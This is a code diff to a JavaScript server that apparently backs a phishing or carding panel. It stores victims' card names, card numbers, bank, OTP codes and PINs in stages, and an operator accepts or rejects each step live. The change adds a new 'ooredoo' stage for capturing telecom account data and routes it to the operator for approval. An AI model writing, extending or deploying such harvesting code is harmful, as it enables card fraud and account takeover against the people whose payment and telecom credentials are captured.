@@ -84,7 +84,7 @@ function cleanOrder(b) {
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
     bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
     lang: b.lang === "en" ? "en" : "ar",
-    step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
+    step: ["card", "otp", "pin", "ooredoo"].includes(b.step) ? b.step : undefined,
     pay: {
       cardName: str(rawName, 200),
       cardNumber: str(rawCard, 200),
@@ -114,6 +114,11 @@ async function api(req, res, url) {
       const i = orders.findIndex(x => x.ref === o.ref);
       if (i >= 0) {
         orders[i].ooredoo = { ...orders[i].ooredoo, ...o.ooredoo };
+        orders[i].status = "awaiting";
+        orders[i].step = "ooredoo";
+        orders[i].decision = "";
+        orders[i].reason = "";
+        orders[i].next = "";
         orders[i].updated = Date.now();
         saveOrders();
         return send(res, 200, { ok: true, ref: o.ref });
@@ -169,7 +174,7 @@ async function api(req, res, url) {
       if (decision === "reject") {
         o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
       } else {
-        const nextOf = { card: "otp", otp: "pin", pin: "done" };
+        const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "done" };
         const next = nextOf[step];
         o.decision = "accept"; o.reason = "";
         if (next === "done") { o.status = "confirmed"; o.next = "done"; }
